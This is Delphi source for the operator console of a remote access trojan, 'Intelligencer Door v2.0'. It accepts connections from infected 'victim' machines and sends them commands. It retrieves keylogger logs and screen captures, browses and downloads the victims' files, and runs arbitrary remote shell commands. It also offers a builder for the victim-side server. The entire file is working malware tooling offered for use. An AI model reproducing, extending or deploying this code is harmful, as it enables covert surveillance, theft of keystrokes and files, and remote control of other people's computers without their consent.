unit UID;

interface

uses
  Windows, Messages, SysUtils, Classes, Controls, Forms, Dialogs,
  StdCtrls, ComCtrls, ScktComp, Spin, XPMan, Menus, ExtCtrls, StrUtils,
  MSNPopUp, AppEvnts, TrayIcon, WinSock;

type
  TFrm33585IDPrincipal = class(TForm)
    SrvrSckt: TServerSocket;
    LtvServidores: TListView;
    Mm: TMainMenu;
    MniMais: TMenuItem;
    Xpmnfst: TXPManifest;
    Pm1: TPopupMenu;
    Stat: TStatusBar;
    Mnikeylogger: TMenuItem;
    mniicones: TMenuItem;
    MniDeskIcones1: TMenuItem;
    MniDeskIcones2: TMenuItem;
    MniMonitor: TMenuItem;
    MniRelogio: TMenuItem;
    btnshut: TMenuItem;
    mnilogoff: TMenuItem;
    mnidesligarwindows: TMenuItem;
    mnireiniciarwindows: TMenuItem;
    MniCDROM: TMenuItem;
    MniBarraTarefas: TMenuItem;
    MniIniciar: TMenuItem;
    mnifilemanager: TMenuItem;
    mniteclado: TMenuItem;
    MniCaps: TMenuItem;
    mnisrv: TMenuItem;
    Mnidesinfectar: TMenuItem;
    mnicriarsrv: TMenuItem;
    N5: TMenuItem;
    mnicmdremoto: TMenuItem;
    Msnp: TMSNPopUp;
    Pm2: TPopupMenu;
    mnisair: TMenuItem;
    Trycn: TTrayIcon;
    SePorta: TSpinEdit;
    MniAtivarbusca: TMenuItem;
    N8: TMenuItem;
    mniativar: TMenuItem;
    Tmr: TTimer;
    MniNum: TMenuItem;
    MniScroll: TMenuItem;
    Mniscreenlogger: TMenuItem;
    TmrModal: TTimer;
    MniN2: TMenuItem;
    MniAbrir: TMenuItem;
    MniLoggers: TMenuItem;
    MniHardwareControls: TMenuItem;
    MniSoftwareControls1: TMenuItem;
    MniDiagnostico: TMenuItem;
    MniSobre: TMenuItem;
    MniMouse: TMenuItem;
    procedure SrvrScktClientConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure SrvrScktClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure SrvrScktClientError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure SrvrScktClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure mnicriarsrvClick(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure MniDeskIcones1Click(Sender: TObject);
    procedure mnifilemanagerClick(Sender: TObject);
    procedure mnisairClick(Sender: TObject);
    procedure mniativarClick(Sender: TObject);
    procedure FormActivate(Sender: TObject);
    procedure TmrTimer(Sender: TObject);
    procedure TmrModalTimer(Sender: TObject);
    procedure MniAbrirClick(Sender: TObject);
    procedure mnicmdremotoClick(Sender: TObject);
    procedure MniSobreClick(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
    procedure AppOnMinimize(Sender: TObject);
  end;

var
  Frm33585IDPrincipal: TFrm33585IDPrincipal;
  Arquivo     : TFileStream;
  Transferindo: Boolean;
  Tamanho     : Integer;

implementation

uses UKL, UCS, USL, UFM, UDG;

{$R *.dfm}

procedure SendCommand(Ltv: TListView; Sckt: TServerSocket; Command: string);
begin
  if (Ltv.Selected = nil) then
  begin
    MessageBox(Application.Handle, 'Primeiro Conecte-se a Uma Vitima'
    + #13 + 'Verifique Suas Conexões!', 'Erro', MB_OK
    + MB_DEFBUTTON1 + MB_ICONERROR);
    Exit;
   end else
    //Sckt.Socket.Connections[Ltv.ItemIndex].SendText(Command);
    Send(Sckt.Socket.Connections[Ltv.ItemIndex].SocketHandle, Pointer(Command)^, Length(Command), 0);
end;

function IconNumber(Ext: string): Integer;
begin
  if ((Ext = '.mp3') or (Ext = '.wav') or (Ext = '.ogg')
  or (Ext = '.midi') or (Ext = '.mid') or (Ext = '.cda')) then Result := 6
  else if ((Ext = '.avi') or (Ext = '.mpg') or (Ext = '.mpeg')
  or (Ext = '.asf') or (Ext = '.wmv') or (Ext = '.mov')) then Result := 7
  else if ((Ext = '.jpg') or (Ext = '.jpeg') or (Ext = '.gif')
  or (Ext = '.png') or (Ext = '.pdf')) then Result := 4
  else if (Ext = '.sys') or (Ext = '.cpl') then Result := 2
  else if (Ext = '.txt') or(Ext = '.ini') then Result := 5
  else if (Ext = '.html') or (Ext = '.htm') or (Ext = '.php') then Result := 8
  else if (Ext = '.exe') or (Ext = '.com') or (Ext = '.scr') then Result := 2
  else if (Ext = '.bat') or (Ext = '.cmd') then Result := 9
  else if (Ext = '.zip') or (Ext = '.rar') or (Ext = '.ace') then Result := 10
  else if (Ext = '.doc') or (Ext = '.rtf') then Result := 11
  else if (Ext = '.ppt') or (Ext = '.pps') then Result := 12
  else if (Ext = '.xls') or (Ext = '.xml') then Result := 14
  else if (Ext = '.bmp') or (Ext = '.ico') then Result := 4
  else if (Ext = '.dll') or (Ext = '.ocx') or (Ext = '.vxd') then Result := 20
  else Result := 1;
end;

function GetSize(Size: string): string;
 var
  I, N: Integer;
  X   : string;
begin
  N := 0;
  I := Length(Size) + 1;
  repeat
    Dec(I, 3);
    if (I > 1) then
      Insert('.', Size, I);
    Inc(N)
  until I <= 1;
  Delete(Size, Pos('.', Size), Length(Size));
  case N of
    2: X := 'K';
    3: X := 'M';
    4: X := 'G';
  end;
  Result := Size + ' ' + X + 'B';
end;

procedure TFrm33585IDPrincipal.AppOnMinimize(Sender: TObject);
begin
  Frm33585IDPrincipal.Visible := False;
  trycn.Visible := True;
end;

procedure TFrm33585IDPrincipal.TmrTimer(Sender: TObject);
begin
  stat.Panels[0].Text := 'Status: Busca Ativa, Aguardando...';
  Trycn.Hint := 'Busca Ativa, Aguardando...';
end;

procedure TFrm33585IDPrincipal.SrvrScktClientConnect(Sender: TObject;
  Socket: TCustomWinSocket);
 var
  L: TListItem;
begin
  L := LtvServidores.Items.Add;
  L.Caption := IntToStr(Socket.Handle);
  L.SubItems.Add(Socket.RemoteHost);
  L.SubItems.Add(Socket.RemoteAddress);
  L.SubItems.Add(TimeToStr(Time));
  L.Data := Socket.Data;

  Msnp.Text := IntToStr(Socket.Handle) + ' - ' + Socket.RemoteAddress;
  Msnp.Title := TimeToStr(Time) + ' - Conexão Ativa:';
  Msnp.ShowPopUp;
  stat.Panels.Items[2].Text := 'Conexões: ' + IntToStr(Frm33585IDPrincipal.ltvservidores.Items.Count);
end;

procedure TFrm33585IDPrincipal.SrvrScktClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
 var
  L: TListItem;
begin
  L := ltvservidores.FindCaption(0, IntToStr(Socket.Handle), False, True, False);
  if (L <> nil) then
    L.Delete;
  stat.Panels.Items[2].Text := 'Conexões: ' + IntToStr(ltvservidores.Items.Count);
end;

procedure TFrm33585IDPrincipal.SrvrScktClientError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
 var
  L: TListItem;
begin
  ErrorCode := 0;
  L := ltvservidores.FindCaption(0, IntToStr(Socket.Handle), False, True, False);
  if (L <> nil) then
    L.Delete;
  stat.Panels.Items[2].Text := 'Conexões: ' + IntToStr(ltvservidores.Items.Count);
end;

procedure TFrm33585IDPrincipal.SrvrScktClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
 var
  Diag, KL: TextFile;
  Lista: TListItem;
  I: Integer;
  Buf, D, Dirs, Arqs, Line, ReceiveTxt: string;
begin
  ReceiveTxt := Socket.ReceiveText;
  if Transferindo then
    Buf := ReceiveTxt;
  if ((Length(ReceiveTxt) > 5) and (Copy(ReceiveTxt, 1, 5) = 'Rk06:')) then
  begin
    Delete(ReceiveTxt, 1, 5);
    Buf := ReceiveTxt;
    if not Transferindo then
    case StrToInt(Buf[1]) of
      1:  begin
            Tamanho := StrToInt(Copy(Buf, 2, Pos('|', Buf) - 2));
            Delete(Buf, 1, Pos('|', Buf));
            Transferindo := True;
            Arquivo := TFileStream.Create(FrmExplorer.Salvar, fmCreate or fmOpenWrite);
            FrmExplorer.pb.Max := Tamanho;
          end;

      2:  begin
            Delete(Buf, 1, 1);
            while Length(Buf) <> 0 do
            begin
              D := Copy(Buf, 1, 4);
              I := StrToInt(Buf[4]) + 13;
              FrmExplorer.cbbunt.ItemsEx.AddItem(Copy(Buf, 1, 3), I, I, -1, -1, nil);
              Delete(Buf, 1, 4);
            end;
          end;

      3:  begin
            FrmExplorer.lvexplorer.Clear;
            Delete(Buf, 1, 1);
            Dirs := Copy(Buf, 1, Pos(#1, Buf) - 1);
            Arqs := Copy(Buf, Pos(#1, Buf) + 2, Length(Buf));
            while (Pos('|', Dirs) <> 0) do
            begin
              Lista := FrmExplorer.lvexplorer.Items.Add;
              Lista.Caption := Copy(Dirs, 1, Pos('|', Dirs) - 1);
              Delete(Dirs, 1, Pos('|', Dirs));
              Lista.ImageIndex := 0;
            end;
            while (Pos('|', Arqs) <> 0) do
            begin
              Lista := FrmExplorer.lvexplorer.Items.Add;
              Lista.Caption := Copy(Arqs, 1, Pos('|', Arqs) - 1);
              Delete(Arqs, 1, Pos('|', Arqs));
              Lista.SubItems.Add(GetSize(Copy(Arqs, 1, Pos('|', Arqs) - 1)));
              Delete(Arqs, 1, Pos('|', Arqs));
              Lista.ImageIndex := IconNumber(LowerCase(ExtractFileExt(Lista.Caption)));
            end;
          end;
    end;
  end;

  if (Pos('Diagnosticosim - PATH:', ReceiveTxt) > 0) then
  begin
    if not DirectoryExists(GetCurrentDir + '\Downloads') then
      CreateDir(GetCurrentDir + '\Downloads');
    FrmExplorer.Salvar := GetCurrentDir + '\Downloads\DIAG.txt';
    Delete(ReceiveTxt, 1, 22);
    SendCommand(LtvServidores, SrvrSckt, 'Rk06:' + IntToStr(GET_FILE) + ReceiveTxt);
    FrmDiagnostico.Show;
    Exit;
  end else if (Pos('Keylogsim - PATH:', ReceiveTxt) > 0) then
  begin
    if not DirectoryExists(GetCurrentDir + '\Downloads') then
      CreateDir(GetCurrentDir + '\Downloads');
    FrmExplorer.Salvar := GetCurrentDir + '\Downloads\KL.txt';
    Delete(ReceiveTxt, 1, 17);
    SendCommand(LtvServidores, SrvrSckt, 'Rk06:' + IntToStr(GET_FILE) + ReceiveTxt);
    FrmKeyLogger.Show;
    Exit;
  end else if (Pos('Screensim - PATH:', ReceiveTxt) > 0) then
  begin
    if not DirectoryExists(GetCurrentDir + '\Loggers') then
      CreateDir(GetCurrentDir + '\Loggers');
    FrmExplorer.Salvar := GetCurrentDir + '\Loggers\' + 'Screen - '
    + ltvservidores.Selected.SubItems.Strings[1] + '.bmp';
    Delete(ReceiveTxt, 1, 17);
    SendCommand(LtvServidores, SrvrSckt, 'Rk06:' + IntToStr(GET_FILE) + ReceiveTxt);
    FrmScreenLogger.Show;
    Exit;
  end else if ((Length(ReceiveTxt) = 17) and (Copy(ReceiveTxt, 1, Length(ReceiveTxt) - 1) = 'UFJJTUFSWUZVTkNT')) then
  begin
    case StrToInt((Copy(ReceiveTxt, Length(ReceiveTxt), 1))) of
      1: stat.Panels[0].Text := 'Status: Ação Realizada Com Sucesso!';
      0: stat.Panels[0].Text := 'Status: Ocorreu Um Erro ao Executar a Ação!';
    end;
    Exit;
  end else if (ReceiveTxt = 'logssim') then
  begin
    FrmKeyLogger.Show;
    Exit;
  end;

  if Transferindo then
  begin
    Arquivo.Write(Buf[1], Length(Buf));
    Dec(Tamanho, Length(Buf));
    FrmExplorer.Pb.Position := FrmExplorer.Pb.Position + Length(Buf);
    if (Tamanho = 0) then
    begin
      Arquivo.Free;
      Buf := '';
      if (FrmExplorer.Salvar = GetCurrentDir + '\Downloads\DIAG.txt') then
      begin
        AssignFile(Diag, GetCurrentDir + '\Downloads\DIAG.txt');
        Reset(Diag);
        while not Eof(Diag) do
        begin
          Readln(Diag, Line);
          FrmDiagnostico.Mmo.Lines.Add(Line);
        end;
        CloseFile(Diag);
        DeleteFile(GetCurrentDir + '\Downloads\DIAG.txt');
      end else if (FrmExplorer.Salvar = GetCurrentDir + '\Downloads\KL.txt') then
      begin
        AssignFile(KL, GetCurrentDir + '\Downloads\KL.txt');
        Reset(KL);
        while not Eof(KL) do
        begin
          Readln(KL, Line);
          FrmKeyLogger.Mmo.Lines.Add(Line);
        end;
        CloseFile(KL);
        DeleteFile(GetCurrentDir + '\Downloads\KL.txt');
        SendCommand(ltvservidores, SrvrSckt, 'DeleteKL');
      end else if (FrmExplorer.Salvar = GetCurrentDir + '\Loggers\' + 'Screen - ' +
      ltvservidores.Selected.SubItems.Strings[1] + '.bmp') then
      begin
        FrmScreenLogger.ImgScnLogger.Picture.LoadFromFile(GetCurrentDir +
        '\Loggers\' + 'Screen - ' + ltvservidores.Selected.SubItems.Strings[1] + '.bmp');
      end else begin
        MessageBox(FrmExplorer.Handle, 'Foi Feita a Transferência Com Sucesso!',
        'Concluido!', MB_OK + MB_DEFBUTTON1 + MB_ICONINFORMATION);
      end;
      FrmExplorer.Pb.Position := 0;
      Transferindo := False;
    end;
  end;
end;

procedure TFrm33585IDPrincipal.MniDeskIcones1Click(Sender: TObject);
 var
  Command: string;
begin
  if TMenuItem(Sender).AutoCheck then
    Command := Copy(TMenuItem(Sender).Name, 4, Length(TMenuItem(Sender).Name)) + IntToStr(Integer(TMenuItem(Sender).Checked))
  else
    Command := Copy(TMenuItem(Sender).Name, 4, Length(TMenuItem(Sender).Name));
  SendCommand(ltvservidores, SrvrSckt, Command);
  Frm33585IDPrincipal.TmrModal.Enabled := True;
end;

procedure TFrm33585IDPrincipal.mnifilemanagerClick(Sender: TObject);
begin
  if (LtvServidores.Selected = nil) then
  begin
    MessageBox(Application.Handle, 'Primeiro Conecte-se a Uma Vitima'
    + #13 + 'Verifique Suas Conexões!', 'Erro', MB_OK
    + MB_DEFBUTTON1 + MB_ICONERROR);
    Exit;
  end else
    FrmExplorer.Show;
    SendCommand(LtvServidores, SrvrSckt, 'Rk06:' + IntToStr(GET_DRIV));
    Frm33585IDPrincipal.TmrModal.Enabled := True;
end;

procedure TFrm33585IDPrincipal.mnicriarsrvClick(Sender: TObject);
begin
  FrmCriarServer.ShowModal;
end;

procedure TFrm33585IDPrincipal.mnisairClick(Sender: TObject);
begin
  Application.Terminate;
end;

procedure TFrm33585IDPrincipal.mniativarClick(Sender: TObject);
begin
  if (TMenuItem(Sender).Caption = '&Ativar Busca') then
  begin
    mniativarbusca.Caption := 'Parar Busca';
    mniativar.Caption := 'Parar Busca';
    srvrsckt.Port := seporta.Value;
    srvrsckt.Active := True;
    stat.Panels[0].Text := 'Status: Procurando...';
    Trycn.Hint := 'Procurando...';
    tmr.Enabled := True;
    seporta.Enabled := False;
  end else begin
    mniativarbusca.Caption := 'Ativar Busca';
    mniativar.Caption := 'Ativar Busca';
    LtvServidores.Clear;
    Tmr.Enabled := False;
    SrvrSckt.Active := False;
    stat.Panels[0].Text := 'Status: Busca Interrompida...';
    Trycn.Hint := 'Busca Interrompida...';
    seporta.Enabled := True;
  end;
end;

procedure TFrm33585IDPrincipal.FormActivate(Sender: TObject);
begin
  Transferindo := False;
  Application.OnMinimize := AppOnMinimize;
end;

procedure TFrm33585IDPrincipal.FormClose(Sender: TObject;
  var Action: TCloseAction);
begin
  AnimateWindow(Handle, 1000, AW_HIDE + AW_BLEND);
end;

procedure TFrm33585IDPrincipal.TmrModalTimer(Sender: TObject);
begin
  if (FrmExplorer.Showing or FrmKeyLogger.Showing or FrmScreenLogger.Showing
  or FrmDiagnostico.Showing) then
    EnableWindow(Frm33585IDPrincipal.Handle, False);
end;

procedure TFrm33585IDPrincipal.MniAbrirClick(Sender: TObject);
begin
  Frm33585IDPrincipal.Visible := True;
  trycn.Visible := False;
  Application.Restore;
end;

procedure TFrm33585IDPrincipal.mnicmdremotoClick(Sender: TObject);
 var
  S: string;
begin
  if InputQuery('CMD Remoto', 'Digite Um Comando Para o Prompt do Windows:', S) then
  begin
    SendCommand(ltvservidores, SrvrSckt, 'CMD:' + S);
  end;
end;

procedure TFrm33585IDPrincipal.MniSobreClick(Sender: TObject);
begin
  MessageBox(Handle, 'Intelligencer Door v2.0' + #13 + #13
  + 'Criado Por 3XT3RM1N4T0R' + #13 + #13 + 'Contato: c0d3r_3xt3rm1n4t0r@hotmail.com',
  'Info (Sobre)', MB_OK + MB_DEFBUTTON1 + MB_ICONINFORMATION);
end;

end.
